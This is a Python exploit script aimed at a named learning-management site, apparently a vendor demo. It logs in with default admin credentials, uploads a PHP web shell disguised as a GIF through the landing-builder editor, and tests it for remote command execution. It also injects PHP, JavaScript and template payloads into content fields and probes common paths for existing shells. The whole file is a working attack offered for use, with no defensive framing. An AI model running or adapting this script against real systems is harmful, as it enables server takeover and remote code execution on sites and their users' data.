import requests
import re
import time

BASE_URL = "https://lms.rocket-soft.org"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()

def login():
    print("[*] Logging in as Admin...")
    try:
        r = session.get(f"{BASE_URL}/admin/login")
        csrf_token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
        data = {"_token": csrf_token, "email": ADMIN_EMAIL, "password": ADMIN_PASS}
        r = session.post(f"{BASE_URL}/admin/login", data=data)
        if "/admin" in r.url or "/panel" in r.url:
            print("[+] Login successful.")
            return True
        else:
            print("[-] Login failed.")
            return False
    except Exception as e:
        print(f"[-] Login error: {e}")
        return False

def get_csrf(url):
    try:
        r = session.get(url)
        match = re.search(r'name="_token" value="([^"]+)"', r.text)
        if match:
            return match.group(1), r.text
        return None, r.text
    except:
        return None, ""

def exploit_landing_builder():
    """Try RCE via Landing Builder content injection"""
    print("\n[*] Attempting RCE via Landing Builder...")
    
    # Get landing builder page list
    r = session.get(f"{BASE_URL}/admin/landing-builder")
    
    # Find landing page IDs
    landing_ids = list(set(re.findall(r'/admin/landing-builder/(\d+)/edit', r.text)))
    print(f"[*] Found landing pages: {landing_ids}")
    
    for lid in landing_ids:
        print(f"\n[*] Checking landing page ID: {lid}")
        
        csrf, page = get_csrf(f"{BASE_URL}/admin/landing-builder/{lid}/edit")
        
        # Look for editable content fields
        textareas = re.findall(r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>', page)
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', page)
        
        content_fields = [f for f in textareas + inputs if 'content' in f.lower() or 'html' in f.lower() or 'body' in f.lower() or 'section' in f.lower()]
        print(f"    Content fields: {content_fields[:10]}")
        
        # Look for JSON data in the page (many landing builders store content as JSON)
        json_data = re.findall(r'data-(?:content|sections|elements)=["\']([^"\']+)["\']', page)
        if json_data:
            print(f"    [!] Found JSON content data")
        
        # Check for image upload
        file_inputs = re.findall(r'<input[^>]*type=["\']file["\'][^>]*name=["\']([^"\']+)["\']', page)
        if file_inputs:
            print(f"    [!] Found file upload fields: {file_inputs}")
            
            # Try uploading PHP shell disguised as image
            shell_content = b"GIF89a<?php system($_GET['c']); ?>"
            
            for field in file_inputs[:3]:
                files = {field: ('shell.php.gif', shell_content, 'image/gif')}
                data = {'_token': csrf, '_method': 'PUT'}
                
                r = session.post(f"{BASE_URL}/admin/landing-builder/{lid}", files=files, data=data)
                print(f"    Upload attempt ({field}): Status {r.status_code}")
                
                # Check for uploaded file path in response
                paths = re.findall(r'["\'](/store[^"\']+\.(?:php|gif)[^"\']*)["\']', r.text)
                for path in paths:
                    print(f"    Checking: {path}")
                    check = session.get(f"{BASE_URL}{path}?c=id")
                    if "uid=" in check.text:
                        print(f"\n[!!!] RCE SUCCESS! Shell: {BASE_URL}{path}")
                        return True
        
        # Try to inject PHP in content fields
        if content_fields:
            rce_payloads = [
                "<?php system($_GET['c']); ?>",
                "<script>fetch('/'+btoa('rce'))</script>",
                "{{system('id')}}",
            ]
            
            for field in content_fields[:3]:
                for payload in rce_payloads[:2]:
                    data = {
                        '_token': csrf,
                        '_method': 'PUT',
                        field: payload
                    }
                    
                    r = session.post(f"{BASE_URL}/admin/landing-builder/{lid}", data=data)
                    print(f"    Inject {field}: Status {r.status_code}")
    
    return False

def check_existing_shells():
    """Check common shell paths in case they were uploaded previously"""
    print("\n[*] Checking for existing shells...")
    
    shell_paths = [
        "/shell.php",
        "/root_shell.php",
        "/rce.php",
        "/s.php",
        "/store/shell.php",
        "/public/shell.php",
    ]
    
    for path in shell_paths:
        try:
            r = session.get(f"{BASE_URL}{path}?c=id")
            if r.status_code == 200 and "uid=" in r.text:
                print(f"[!!!] Found existing shell: {BASE_URL}{path}")
                print(f"[!!!] Output: {r.text[:100]}")
                return True
        except:
            pass
    
    print("    No existing shells found")
    return False

def main():
    if not login():
        return
    
    # Check for any existing shells first
    if check_existing_shells():
        return
    
    # Try Landing Builder exploitation
    if exploit_landing_builder():
        return
    
    print("\n[*] Landing Builder exploitation complete.")

if __name__ == "__main__":
    main()
